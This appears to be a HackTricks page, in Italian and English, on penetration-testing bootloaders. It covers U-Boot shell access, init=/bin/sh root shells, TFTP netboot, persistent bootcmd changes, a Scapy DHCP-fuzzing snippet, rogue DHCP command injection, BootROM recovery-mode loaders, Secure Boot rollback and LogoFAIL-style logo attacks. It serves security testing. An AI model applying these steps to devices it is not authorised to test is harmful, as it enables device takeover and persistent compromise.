# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

I seguenti passaggi sono consigliati per modificare le configurazioni di startup del dispositivo e testare bootloaders come U-Boot e loader di classe UEFI. Concentrarsi sull'ottenimento di code execution precoce, valutare le signature/rollback protections e abusare dei percorsi di recovery o network-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- Durante il boot, premere un tasto di break noto (spesso qualsiasi tasto, 0, space, o una sequenza "magica" specifica della board) prima che `bootcmd` venga eseguito per entrare al prompt di U-Boot.

2. Inspect boot state and variables
- Comandi utili:
- `printenv` (dump dell'environment)
- `bdinfo` (info sulla board, indirizzi di memoria)
- `help bootm; help booti; help bootz` (metodi supportati per boot del kernel)
- `help ext4load; help fatload; help tftpboot` (loader disponibili)

3. Modify boot arguments to get a root shell
- Aggiungere `init=/bin/sh` in modo che il kernel inizi una shell invece del normale init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Configurare la rete e scaricare un kernel/fit image dalla LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Se lo storage dell'env non è write-protected, è possibile rendere persistenti le modifiche:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Controllare variabili come `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` che influenzano i percorsi di fallback. Valori mal configurati possono permettere ripetuti accessi alla shell.

6. Check debug/unsafe features
- Cercare: `bootdelay` > 0, `autoboot` disabilitato, `usb start; fatload usb 0:1 ...` non restrittivi, abilità di `loady`/`loads` via serial, `env import` da media non affidabili, e kernel/ramdisk caricati senza signature checks.

7. U-Boot image/verification testing
- Se la piattaforma dichiara secure/verified boot con FIT images, provare sia immagini unsigned che manomesse:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L'assenza di `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o il comportamento legacy `verify=n` spesso permette il boot di payload arbitrari.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- L'handling legacy BOOTP/DHCP di U-Boot ha avuto problemi di memory-safety. Per esempio, CVE‑2024‑42040 descrive una memory disclosure tramite risposte DHCP craftate che possono leak byte dalla memoria di U-Boot sulla rete. Eseguire i percorsi di DHCP/PXE con valori eccessivamente lunghi o edge-case (option 67 bootfile-name, vendor options, file/servername fields) e osservare blocchi/leak.
- Minimal Scapy snippet per stressare i parametri di boot durante il netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Verificare anche se i campi filename del PXE vengono passati alla shell/logic del loader senza sanitizzazione quando concatenati a script di provisioning lato OS.

9. Rogue DHCP server command injection testing
- Impostare un rogue DHCP/PXE service e tentare di iniettare caratteri nei campi filename o options per raggiungere interpreter di comandi nelle fasi successive della catena di boot. Metasploit’s DHCP auxiliary, `dnsmasq`, o script Scapy custom funzionano bene. Isolare prima la rete di laboratorio.

## SoC ROM recovery modes that override normal boot

Molti SoC espongono una modalità BootROM "loader" che accetta codice via USB/UART anche quando le immagini flash sono invalide. Se i fuse di secure-boot non sono bruciati, questo può fornire arbitrary code execution molto presto nella catena.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` per pushare ed eseguire un U-Boot custom da RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` per stageare un loader e uploadare un U-Boot custom.

Valutare se il dispositivo ha secure-boot eFuses/OTP bruciati. Se no, le BootROM download modes frequentemente bypassano qualsiasi verifica di livello superiore (U-Boot, kernel, rootfs) eseguendo il vostro first-stage payload direttamente da SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Montare la EFI System Partition (ESP) e cercare componenti del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, percorsi del vendor logo.
- Provare a bootare con componenti signed downgraded o noti vulnerabili se le revoche di Secure Boot (dbx) non sono aggiornate. Se la piattaforma ancora si fida di vecchi shims/bootmanagers, spesso è possibile caricare il proprio kernel o `grub.cfg` dall'ESP per ottenere persistence.

11. Boot logo parsing bugs (LogoFAIL class)
- Diversi firmware OEM/IBV erano vulnerabili a flaw di parsing di immagini in DXE che processano boot logos. Se un attaccante può posizionare un'immagine craftata sull'ESP in un percorso vendor-specific (es., `\EFI\<vendor>\logo\*.bmp`) e riavviare, code execution durante l'early boot può essere possibile anche con Secure Boot abilitato. Testare se la piattaforma accetta logo forniti dall'utente e se quei percorsi sono scrivibili dall'OS.

## Hardware caution

Essere cauti quando si interagisce con SPI/NAND flash durante l'early boot (es., mettendo a massa pin per bypassare letture) e consultare sempre il datasheet della flash. Cortocircuiti temporizzati male possono corrompere il dispositivo o il programmer.

## Notes and additional tips

- Provare `env export -t ${loadaddr}` e `env import -t ${loadaddr}` per muovere blob di environment tra RAM e storage; alcune piattaforme permettono l'import dell'env da media removibili senza autenticazione.
- Per persistence su sistemi Linux che bootano via `extlinux.conf`, modificare la riga `APPEND` (per iniettare `init=/bin/sh` o `rd.break`) sulla boot partition spesso basta quando non sono imposte signature checks.
- Se lo userland fornisce `fw_printenv/fw_setenv`, verificare che `/etc/fw_env.config` corrisponda al reale storage dell'env. Offset mal configurati permettono di leggere/scrivere la regione MTD sbagliata.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
